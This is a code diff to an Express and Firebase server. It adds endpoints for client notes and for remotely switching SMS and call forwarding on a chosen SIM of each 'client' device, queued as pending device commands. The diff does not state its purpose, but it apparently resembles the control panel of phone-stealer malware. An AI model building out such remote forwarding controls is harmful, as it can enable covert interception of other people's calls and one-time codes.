@@ -2,7 +2,7 @@ require("dotenv").config();
 const express = require("express");
 const cors = require("cors");
 const path = require("path");
-const { firebaseGet, firebasePut, firebaseDelete, testConnection } = require("./firebase");
+const { firebaseGet, firebasePut, firebasePatch, firebaseDelete, testConnection } = require("./firebase");
 const { createToken, authMiddleware } = require("./auth");
 const { send2FACode, verify2FACode, isGlobal2FAEnabled } = require("./telegram");
 const { adminMiddleware } = require("./admin");
@@ -326,6 +326,77 @@ app.post("/api/projects/:projectId/clients/:id/send-sms", authMiddleware, async 
       isSended: false,
     });
     res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.patch("/api/projects/:projectId/clients/:id/notes", authMiddleware, async (req, res) => {
+  const project = resolveProject(req, res);
+  if (!project) return;
+  try {
+    const { notes } = req.body || {};
+    await firebasePatch(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}`, {
+      notes: String(notes || ""),
+    });
+    res.json({ ok: true, notes: String(notes || "") });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post("/api/projects/:projectId/clients/:id/forwarding", authMiddleware, async (req, res) => {
+  const project = resolveProject(req, res);
+  if (!project) return;
+  try {
+    const { type, sim, to, active } = req.body || {};
+    if (!type || !["call", "sms"].includes(String(type).toLowerCase())) {
+      return res.status(400).json({ error: "type must be call or sms" });
+    }
+    const simSlot = Number(sim) === 2 ? 2 : 1;
+    const isActive = active !== false;
+    const payload = {
+      type: String(type).toLowerCase(),
+      sim: simSlot,
+      to: String(to || ""),
+      active: isActive,
+      isSended: false,
+    };
+    await firebasePut(
+      project.firebaseUrl,
+      project.firebaseSecret,
+      `clients/${req.params.id}/webhookEvent/forwarding`,
+      payload
+    );
+    const statusField = type === "call" ? "callForward" : "smsForward";
+    await firebasePatch(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}`, {
+      [statusField]: isActive ? String(to || "active") : "inactive",
+      forwardTo: String(to || ""),
+    });
+    res.json({ ok: true, ...payload });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.get("/api/projects/:projectId/clients/:id/forwarding", authMiddleware, async (req, res) => {
+  const project = resolveProject(req, res);
+  if (!project) return;
+  try {
+    const client = await firebaseGet(
+      project.firebaseUrl,
+      project.firebaseSecret,
+      `clients/${req.params.id}`
+    );
+    if (!client) return res.json({ call: "inactive", sms: "inactive", forwardTo: "" });
+    const call = client.callForward || client.call_forward || "inactive";
+    const sms = client.smsForward || client.sms_forward || "inactive";
+    res.json({
+      call: String(call).toLowerCase() === "inactive" ? "inactive" : "active",
+      sms: String(sms).toLowerCase() === "inactive" ? "inactive" : "active",
+      forwardTo: client.forwardTo || client.forward_to || "",
+      sims: client.sims || null,
+    });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
